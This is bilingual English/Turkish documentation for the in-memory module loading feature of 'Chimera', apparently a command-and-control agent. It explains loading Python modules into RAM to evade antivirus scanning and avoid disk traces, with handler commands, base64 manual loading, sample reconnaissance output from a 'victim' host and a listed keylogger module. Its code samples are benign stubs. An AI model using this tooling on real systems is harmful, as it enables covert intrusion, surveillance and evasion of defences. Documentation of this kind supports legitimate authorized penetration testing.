# Chimera In-Memory Module Loading Guide / Kullanım Kılavuzu

[🇬🇧 English](#-english) | [🇹🇷 Türkçe](#-türkçe)

---

<a name="-english"></a>
## 🇬🇧 English

This feature grants the Chimera Agent the ability to execute Python code directly in RAM without writing anything to the disk. By doing so, it effectively bypasses file scanning (static analysis) performed by antivirus software.

### Commands

#### 1. `load <file_path>`
Loads a Python file from the handler side into the agent as a module.

**Usage:**
```text
chimera (1) > load modules/payloads/python/chimera/examples/sysinfo_module.py
[*] Loading module: sysinfo_module (1234 bytes)...
[+] Module 'sysinfo_module' successfully loaded (1234 bytes)
```

#### 2. `run <module_name> <function_name> [arguments]`
Executes a specific function from a successfully loaded module.

**Usage:**
```text
chimera (1) > run sysinfo_module get_system_info
[+] Result:
=== System Information ===
hostname: target-pc
platform: Windows-10-10.0.19041-SP0
processor: Intel64 Family 6 Model 142 Stepping 12, GenuineIntel
python_version: 3.9.7
cwd: C:\Users\victim
user: victim
```

**Usage with arguments:**
```text
chimera (1) > run sysinfo_module list_directory C:\Users
[+] Result:
=== C:\Users contents ===
[DIR] Administrator
[DIR] Public
[DIR] victim
```

#### 3. `modules`
Lists all loaded modules and their available functions.

**Usage:**
```text
chimera (1) > modules
[*] Loaded modules:
  - sysinfo_module: get_system_info, list_directory, get_network_info
  - keylogger: start, stop, get_logs
```

### Manual Module Loading (Advanced)

If you want to send a load command directly to the agent without using the handler helper:

```text
loadmodule <module_name> <base64_encoded_code>
```

**Example:**
```python
import base64

code = '''
def hello():
    return "Hello Chimera!"
'''

encoded = base64.b64encode(code.encode()).decode()
# Send to Agent: loadmodule hello_mod <encoded>
```

### Module Development Tips

1. **Use only stdlib**: Modules should exclusively use Python's built-in standard libraries.
2. **Error handling**: Your functions must be protected tightly with `try-except` blocks.
3. **Return values**: Functions should return string values (the agent sends this payload back to the handler).
4. **Isolation**: Each module runs securely within its own isolated namespace.

### Example Module

```python
"""
Example Chimera Module
"""
import os
import platform

def get_info():
    """Returns system information"""
    return f"{platform.system()} - {os.getcwd()}"

def execute_task(command):
    """Executes a custom task"""
    try:
        # Task logic here
        result = f"Task completed: {command}"
        return result
    except Exception as e:
        return f"Error: {str(e)}"
```

### Security Notes

⚠️ **Caution**: This feature is a powerful capability and has the potential for misuse. Use it solely in legal, authorized, and ethical penetration tests.

- Modules run directly in RAM, leaving zero traces on the disk.
- Each module executes within an isolated Python namespace.
- Modules run entirely with the same privileges as the agent process itself.
- Base64 encoding is solely for smooth data transfer; it is not encryption (the underlying C2 TLS connection already encrypts it).

---

<a name="-türkçe"></a>
## 🇹🇷 Türkçe

Bu özellik, Chimera Agent'a Python kodlarını disk'e yazmadan doğrudan RAM'de çalıştırma yeteneği kazandırır. Bu sayede antivirüs yazılımlarının dosya taraması (static analysis) atlatılır.

### Komutlar

#### 1. `load <dosya_yolu>`
Handler tarafında bir Python dosyasını agent'a modül olarak yükler.

**Kullanım:**
```text
chimera (1) > load modules/payloads/python/chimera/examples/sysinfo_module.py
[*] Modül yükleniyor: sysinfo_module (1234 bytes)...
[+] Modül 'sysinfo_module' başarıyla yüklendi (1234 bytes)
```

#### 2. `run <modül_adı> <fonksiyon_adı> [argümanlar]`
Yüklenmiş bir modülün fonksiyonunu çalıştırır.

**Kullanım:**
```text
chimera (1) > run sysinfo_module get_system_info
[+] Sonuç:
=== Sistem Bilgisi ===
hostname: target-pc
platform: Windows-10-10.0.19041-SP0
processor: Intel64 Family 6 Model 142 Stepping 12, GenuineIntel
python_version: 3.9.7
cwd: C:\Users\victim
user: victim
```

**Argümanlı kullanım:**
```text
chimera (1) > run sysinfo_module list_directory C:\Users
[+] Sonuç:
=== C:\Users içeriği ===
[DIR] Administrator
[DIR] Public
[DIR] victim
```

#### 3. `modules`
Yüklenmiş tüm modülleri ve fonksiyonlarını listeler.

**Kullanım:**
```text
chimera (1) > modules
[*] Yüklenmiş modüller:
  - sysinfo_module: get_system_info, list_directory, get_network_info
  - keylogger: start, stop, get_logs
```

### Manuel Modül Yükleme (İleri Seviye)

Eğer handler'dan değil de doğrudan agent'a komut göndermek isterseniz:

```text
loadmodule <modül_adı> <base64_encoded_kod>
```

**Örnek:**
```python
import base64

code = '''
def hello():
    return "Merhaba Chimera!"
'''

encoded = base64.b64encode(code.encode()).decode()
# Agent'a gönder: loadmodule hello_mod <encoded>
```

### Modül Geliştirme İpuçları

1. **Sadece stdlib kullanın**: Modüller sadece Python standart kütüphanelerini kullanmalıdır.
2. **Hata yönetimi**: Fonksiyonlarınız try-except bloklarıyla korunmalıdır.
3. **Return değerleri**: Fonksiyonlar string döndürmelidir (agent bunu handler'a gönderir).
4. **İzolasyon**: Her modül kendi namespace'inde çalışır.

### Örnek Modül

```python
"""
Örnek Chimera Modülü
"""
import os
import platform

def get_info():
    """Sistem bilgisi döndürür"""
    return f"{platform.system()} - {os.getcwd()}"

def execute_task(command):
    """Özel bir görev çalıştırır"""
    try:
        # Görev mantığı
        result = f"Görev tamamlandı: {command}"
        return result
    except Exception as e:
        return f"Hata: {str(e)}"
```

### Güvenlik Notları

⚠️ **Dikkat**: Bu özellik güçlü bir yetenektir ve kötüye kullanılabilir. Sadece yasal ve etik penetrasyon testlerinde kullanın.

- Modüller RAM'de çalıştığı için disk izleri bırakmaz
- Her modül izole bir namespace'de çalışır
- Modüller agent ile aynı yetkilere sahiptir
- Base64 encoding sadece transfer içindir, şifreleme değildir (TLS zaten şifreler)
